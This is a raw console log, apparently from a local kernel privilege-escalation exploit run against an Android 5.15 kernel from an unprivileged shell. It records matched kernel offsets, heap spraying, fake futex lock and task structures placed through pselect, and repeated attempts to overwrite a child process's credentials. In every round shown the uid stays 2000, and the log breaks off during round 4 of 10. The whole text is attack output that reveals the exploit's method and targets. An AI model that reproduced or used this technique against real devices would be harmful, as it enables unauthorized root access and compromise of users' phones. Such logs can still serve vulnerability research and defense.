[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=17548 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=17548 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=17548 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=17548 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+5230ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8004a91200 (48/256 votes)
[33m[*] [0m[T+5413ms] perf_find_task done
[33m[*] [0mchild_pid=19551 child_task=0xffffff8004a91200
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8004a91998 mode=2
[33m[*] [0m[T+12080ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[15432..16138] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+20768ms]   heap spray done
[31m[-] [0mpselect cannot place lock waiter_word=13 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place wake_state waiter_word=14 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=2 page=ffffff8060f30000 fake_lock=ffffff8060f30000 fake_w0=ffffff8060f30300 fake_task=ffffff8060f30400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000001 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+21978ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8004a91998 mode=2
[33m[*] [0m[T+28013ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[15172..15811] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+36133ms]   heap spray done
[31m[-] [0mpselect cannot place lock waiter_word=13 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place wake_state waiter_word=14 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=2 page=ffffff803af20000 fake_lock=ffffff803af20000 fake_w0=ffffff803af20300 fake_task=ffffff803af20400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000001 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+37341ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 3/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8004a91998 mode=2
[33m[*] [0m[T+44244ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[15229..15948] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+52985ms]   heap spray done
[31m[-] [0mpselect cannot place lock waiter_word=13 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place wake_state waiter_word=14 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=2 page=ffffff80d0d98000 fake_lock=ffffff80d0d98000 fake_w0=ffffff80d0d98300 fake_task=ffffff80d0d98400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000001 ex3=0000000000000000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+54191ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 4/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8004a91998 mode=2
[33m[*] [0m[T+61413ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15195..15914] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+70967ms]   heap spray done
[31m[-] [0mpselect cannot place lock waiter_word=13 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place wake_state waiter_word=14 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=2 page=ffffff800eca8000 fake_lock=ffffff800eca8000 fake_w0=ffffff800eca8300 fake_task=ffffff800eca8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000001 ex3=0000000000000000
[33m[*] [0mpselect pre-select +1ms
